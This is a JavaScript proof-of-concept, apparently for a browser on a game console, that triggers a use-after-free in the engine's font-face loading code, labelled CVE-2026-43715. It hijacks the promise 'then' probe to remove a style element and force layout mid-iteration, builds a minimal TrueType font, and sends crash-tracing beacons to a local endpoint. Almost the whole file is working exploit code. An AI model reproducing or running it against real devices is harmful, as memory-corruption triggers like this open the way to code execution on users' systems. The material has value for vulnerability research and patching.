// p445 — CVE-2026-43715 CSSFontFace iterateClients UAF device test
// Beacon prefix: V445-
//
// Setter flow: define a getter on FontFace.prototype.then, load a font that
// reaches CSSFontFace::setStatus(Success) -> iterateClients. The first client
// (the FontFace itself) resolves m_loadedPromise, the engine probes .then on
// the resolved value, our getter runs synchronously inside the client loop:
// it removes a style element that uses the family and forces a layout, which
// disconnects a client from the WeakHashSet mid-iteration. The next callback
// lands on the disconnected object -> UAF.
//
// Crash signature: beacons stop after V445-TRIGGER-n; the process dies inside
// the getter's forced layout or the next client callback.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V445-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 120) +
      '-L' + line + '-C' + col);
    return false;
  };

  var FAMILY = 'p445fam';

  // The thenable probe getter. Runs synchronously inside iterateClients.
  var getterHits = 0;
  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      getterHits++;
      B('THEN-' + getterHits);
      var victim = document.getElementById('victim-style');
      if (victim) {
        victim.remove();
        document.body.offsetHeight; // synchronous layout
        B('THEN-VICTIM-REMOVED');
      }
      return undefined; // not a thenable -> resolve normally, loop continues
    },
    configurable: true
  });
  B('GETTER-SET');

  // A style element whose rule uses the family. This is what gets removed
  // inside the getter; the layout it invalidates disconnects a client.
  function plantVictim() {
    var s = document.createElement('style');
    s.id = 'victim-style';
    s.textContent = '#sink-' + Date.now() + ' { font-family: "' + FAMILY + '", serif; }';
    document.head.appendChild(s);

    var sink = document.createElement('div');
    sink.id = 'sink-' + Date.now();
    sink.textContent = 'x';
    document.body.appendChild(sink);
    return sink;
  }

  // Minimal hand-built TrueType. Real parsers are lenient about checksums;
  // if the PS5 font stack rejects it we still learn from the FAIL beacon.
  function makeTTF() {
    var tags = ['cmap', 'glyf', 'head', 'hhea', 'hmtx', 'loca', 'maxp',
                'name', 'post', 'OS/2'];
    var n = tags.length;
    var header = 12 + n * 16;
    var buf = new ArrayBuffer(header + 512);
    var dv = new DataView(buf);
    var u8 = new Uint8Array(buf);

    dv.setUint32(0, 0x00010000);
    dv.setUint16(4, n);
    dv.setUint16(6, 0); dv.setUint16(8, 0); dv.setUint16(10, 0);

    var off = header;
    for (var t = 0; t < n; t++) {
      var d = 12 + t * 16;
      for (var c = 0; c < 4; c++)
        u8[d + c] = tags[t].charCodeAt(c);
      dv.setUint32(d + 8, off);
      dv.setUint32(d + 12, 64);
      off += 64;
    }

    // head magic inside the head table region
    var h = header + 2 * 64;
    dv.setUint32(h, 0x00010000);
    dv.setUint32(h + 12, 0x5F0F3CF5);

    return buf;
  }

  function dataURI() {
    var u8 = new Uint8Array(makeTTF());
    var s = '';
    for (var i = 0; i < u8.length; i++)
      s += String.fromCharCode(u8[i]);
    return 'data:font/ttf;base64,' + btoa(s);
  }

  // Font sources in priority order: local() names first (system fonts parse
  // for sure), then the built-in TTF.
  var SOURCES = [
    'local(Songti)', 'local(Helvetica)', 'local(SCE-PS3 Rodin LATIN)',
    'local(--default--)', 'url(' + dataURI() + ')'
  ];

  function round(i) {
    B('ROUND-' + i);
    plantVictim();

    var src = SOURCES[Math.min(i % SOURCES.length, SOURCES.length - 1)];
    B('SRC-' + i + '-' + (src.indexOf('local') === 0 ? 'local:' + src.slice(6) : 'ttf'));

    var face;
    try {
      face = new FontFace(FAMILY, src);
    } catch (e) {
      B('CTOR-THROW-' + encodeURIComponent(String(e)).slice(0, 80));
      return;
    }

    document.fonts.add(face);
    B('ADDED-' + i);

    // load() drives setStatus -> iterateClients -> promise resolve -> getter.
    face.load().then(
      function(f) { B('LOADED-' + i + '-HITS' + getterHits); document.fonts.delete(f); },
      function(e) { B('REJECTED-' + i + '-' + encodeURIComponent(String(e)).slice(0, 100) + '-HITS' + getterHits); }
    );

    // Give the engine a moment to run the callback loop before the next
    // round re-plants the victim style.
    setTimeout(function() {
      if (i + 1 < 15) round(i + 1);
      else B('DONE-HITS' + getterHits);
    }, 700);
  }

  round(0);
})();
